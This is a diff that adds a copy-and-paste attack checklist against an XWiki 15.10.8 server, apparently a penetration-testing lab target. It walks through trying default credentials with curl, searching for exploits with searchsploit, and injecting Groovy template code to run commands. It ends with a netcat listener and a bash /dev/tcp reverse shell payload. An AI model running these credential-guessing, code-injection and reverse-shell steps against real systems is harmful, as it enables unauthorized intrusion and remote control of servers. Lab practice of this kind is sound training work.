@@ -1,0 +1,107 @@
+# RUN THESE COMMANDS RIGHT NOW - Copy and paste each section
+
+# ============================================
+# STEP 1: Check Current Status (2 min)
+# ============================================
+
+# Check if XWiki is ready (not initializing)
+curl -s http://10.129.7.80:8080/xwiki/ | head -100
+
+# Check main page
+curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome | head -100
+
+# ============================================
+# STEP 2: Try Authentication Again (5 min)
+# ============================================
+
+# Try admin/admin and save output
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=admin" \
+    -L -c cookies.txt -o login_result.html
+
+# Check if login worked
+cat login_result.html | grep -i "logout\|dashboard\|welcome\|error\|invalid"
+
+# Try xwiki/xwiki
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=xwiki&j_password=xwiki" \
+    -L -c cookies2.txt -o login_result2.html
+
+cat login_result2.html | grep -i "logout\|dashboard\|welcome\|error"
+
+# ============================================
+# STEP 3: Check if Anonymous Access Works (3 min)
+# ============================================
+
+# Try to access edit page without login
+curl -s http://10.129.7.80:8080/xwiki/bin/edit/Main/TestPage | head -100
+
+# Try to view a page
+curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome | head -100
+
+# ============================================
+# STEP 4: Search for Exploits (5 min)
+# ============================================
+
+searchsploit xwiki 15.10
+
+searchsploit xwiki 15
+
+# ============================================
+# STEP 5: Get Your IP for Reverse Shell (1 min)
+# ============================================
+
+ip addr show tun0 | grep inet
+
+# OR if tun0 doesn't exist:
+ifconfig | grep inet
+
+# ============================================
+# STEP 6: Try Template Injection via Web (30 min) ⭐
+# ============================================
+
+# Open in browser: http://10.129.7.80:8080/xwiki
+# 
+# If you can access (even without login), try:
+# 1. Click "Create" or "Edit" a page
+# 2. Add this content:
+#
+# {{groovy}}
+# def proc = 'whoami'.execute()
+# proc.waitFor()
+# println proc.text
+# {{/groovy}}
+#
+# 3. Save and view - should show username
+#
+# 4. If that works, set up listener: nc -lvp 4444
+# 5. Then use reverse shell payload:
+#
+# {{groovy}}
+# def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
+# proc.waitFor()
+# {{/groovy}}
+#
+# Replace YOUR_IP with IP from Step 5
+
+# ============================================
+# STEP 7: Document Everything (10 min)
+# ============================================
+
+# Save all outputs
+mkdir -p ~/xwiki_attempts_$(date +%Y%m%d_%H%M%S)
+cd ~/xwiki_attempts_*
+
+# Copy all results
+cp ~/Downloads/login_result*.html . 2>/dev/null
+cp ~/Downloads/cookies*.txt . 2>/dev/null
+
+# Create summary
+echo "=== XWiki Exploitation Attempt ===" > summary.txt
+date >> summary.txt
+echo "Target: 10.129.7.80:8080" >> summary.txt
+echo "Version: 15.10.8" >> summary.txt
+echo "" >> summary.txt
+echo "=== Status ===" >> summary.txt
+curl -s http://10.129.7.80:8080/xwiki/ | head -20 >> summary.txt
+
